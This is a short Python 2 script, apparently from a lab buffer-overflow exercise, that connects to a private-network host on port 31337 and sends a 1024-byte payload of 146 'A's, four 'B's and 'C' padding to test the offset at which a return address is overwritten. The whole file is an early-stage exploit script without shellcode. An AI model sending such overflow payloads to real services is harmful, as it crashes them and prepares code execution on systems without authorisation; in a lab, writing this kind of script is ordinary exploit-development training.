#!/usr/bin/python python2.7.18
import socket

RHOST = "192.168.21.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# A * 146 + B*4 + C*(1024-146-4)
buf = "A"*146 + "B"*4 + "C"*(1024-146-4)

buf = ""
buf += "A"*146
buf += "B"*4
buf += "C"*(1024-146-4)
buf += "\n"

s.send(buf)
